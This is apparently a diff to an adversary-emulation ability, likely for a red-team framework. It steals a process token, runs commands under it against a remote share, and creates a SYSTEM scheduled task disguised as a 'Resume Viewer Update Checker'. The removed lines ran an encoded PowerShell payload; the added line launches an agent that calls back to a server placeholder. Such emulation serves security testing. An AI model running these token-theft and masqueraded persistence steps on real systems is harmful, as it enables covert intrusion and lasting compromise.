@@ -20,12 +20,8 @@
           StealToken;
 
           CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          
-          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
-          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr "powershell.exe -nop -exec bypass -EncodedCommand $pcode" /sc ONLOGON /RU SYSTEM';
-          
+          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
           CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
           CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
           RevertToSelf;
-        payload: StealToken.ps1,update.ps1
+        payload: StealToken.ps1,sandcat.exe
